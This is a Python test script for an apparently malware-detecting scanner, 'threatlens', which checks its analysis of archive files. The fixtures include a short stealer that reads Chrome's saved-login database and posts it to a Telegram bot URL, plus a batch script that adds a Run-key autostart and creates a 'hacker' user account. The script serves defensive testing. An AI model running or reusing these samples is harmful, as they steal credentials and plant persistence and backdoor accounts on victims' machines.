"""Test RAR/7z/tar.gz archive analysis."""
import sys, os, tempfile, io
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import py7zr
import tarfile
from threatlens.core import analyze_file

stealer_code = (
    "import os, base64, requests\n"
    "chrome = os.path.expanduser('~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data')\n"
    "data = open(chrome, 'rb').read()\n"
    "requests.post('https://api.telegram.org/bot123/sendDocument', files={'f': data})\n"
)

batch_code = (
    "@echo off\r\n"
    "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d loader.exe\r\n"
    "net user hacker Pass123 /add\r\n"
)

# Test 7z
p7z = tempfile.mktemp(suffix=".7z")
with py7zr.SevenZipFile(p7z, "w") as z:
    z.writestr(b"safe file", "readme.txt")
    z.writestr(stealer_code.encode(), "loader.py")

r = analyze_file(p7z, use_cache=False)
print(f"7z: risk={r.risk_level} ({r.risk_score}), findings={len(r.findings)}")
for f in r.findings[:5]:
    print(f"  {f[:80]}")
os.unlink(p7z)

# Test tar.gz
ptgz = tempfile.mktemp(suffix=".tar.gz")
with tarfile.open(ptgz, "w:gz") as tf:
    for name, content in [("readme.txt", b"hello"), ("install.bat", batch_code.encode())]:
        info = tarfile.TarInfo(name=name)
        info.size = len(content)
        tf.addfile(info, io.BytesIO(content))

r2 = analyze_file(ptgz, use_cache=False)
print(f"\ntar.gz: risk={r2.risk_level} ({r2.risk_score}), findings={len(r2.findings)}")
for f in r2.findings[:5]:
    print(f"  {f[:80]}")
os.unlink(ptgz)

# Test ZIP (already worked)
import zipfile
pzip = tempfile.mktemp(suffix=".zip")
with zipfile.ZipFile(pzip, "w") as z:
    z.writestr("safe.txt", "hello")
    z.writestr("hack.py", stealer_code)

r3 = analyze_file(pzip, use_cache=False)
print(f"\nzip: risk={r3.risk_level} ({r3.risk_score}), findings={len(r3.findings)}")
for f in r3.findings[:5]:
    print(f"  {f[:80]}")
os.unlink(pzip)
